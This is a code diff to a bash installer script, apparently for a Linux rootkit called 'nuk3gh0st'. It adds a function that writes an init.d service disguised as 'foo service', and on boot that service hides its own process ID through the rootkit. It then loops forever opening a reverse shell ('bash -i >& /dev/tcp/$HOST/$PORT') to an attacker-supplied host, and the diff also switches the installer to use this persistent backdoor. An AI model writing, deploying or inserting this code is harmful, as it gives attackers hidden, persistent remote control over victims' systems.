@@ -67,6 +67,50 @@ function generate_backdoor {
 	chmod +x $backdoor_path
 }
 
+function generate_init_backdoor {
+	backdoor_path='/usr/share/nuk3gh0st/backdoor'
+	echo "#!/bin/bash" > $backdoor_path
+	echo "### BEGIN INIT INFO" >> $backdoor_path
+	echo "# Provides:          backdoor" >> $backdoor_path
+	echo "# Required-Start:    networking" >> $backdoor_path
+	echo "# Required-Stop:     networking" >> $backdoor_path
+	echo "# Should-Start:      nuk3gh0st.startup" >> $backdoor_path
+	echo "# Default-Start:     2 3 4 5" >> $backdoor_path
+	echo "# Default-Stop:      0 1 6" >> $backdoor_path
+	echo "# Short-Description: foo service" >> $backdoor_path
+	echo "# Description:       Run backdoor service" >> $backdoor_path
+	echo "### END INIT INFO" >> $backdoor_path
+
+
+
+	echo "case \"$1\" in" >> $backdoor_path
+	echo "	start)" >> $backdoor_path
+	echo "		sleep 40" >> $backdoor_path
+	echo "		/usr/bin/nuk3gh0st --hide-pid=\`echo \$$\`" >> $backdoor_path
+	echo "" >> $backdoor_path
+	echo "		while true" >> $backdoor_path
+	echo "		do" >> $backdoor_path
+	echo "			bash -i >& /dev/tcp/$HOST/$PORT 0>&1" >> $backdoor_path
+	echo "			sleep $SLEEP" >> $backdoor_path
+	echo "		done" >> $backdoor_path
+	echo "		;;" >> $backdoor_path
+	echo "  stop)" >> $backdoor_path
+	echo "		;;" >> $backdoor_path
+	echo "	restart)" >> $backdoor_path
+	echo "		;;" >> $backdoor_path
+	echo "	force-reload)" >> $backdoor_path
+	echo "		;;" >> $backdoor_path
+	echo "	status)" >> $backdoor_path
+	echo "		;;" >> $backdoor_path
+	echo "	*)" >> $backdoor_path
+	echo "		echo \"Usage: /etc/init.d/backdoor {start|stop}\"" >> $backdoor_path
+	echo "		exit 1" >> $backdoor_path
+	echo "		;;" >> $backdoor_path
+	echo "esac" >> $backdoor_path
+	echo "exit 0" >> $backdoor_path
+
+	}
+
 function enable_selinux {
 	echo -e "${item} Reenabling SELINUX"
 	echo -e "   ${purple} cmd: setenforce 1${endColor}"
@@ -301,7 +345,7 @@ done
 
 if [[ $HOST_ARG && $PORT_ARG && $SLEEP_ARG && -z $HELP_ARG && -z $REMOVE_ARG ]]
 then
-	generate_backdoor
+	generate_init_backdoor
 	check_selinux_enable_startup_service
 elif [[ -z $HOST_ARG && -z $PORT_ARG && -z $SLEEP_ARG && -z $HELP_ARG && $REMOVE_ARG ]]
 then
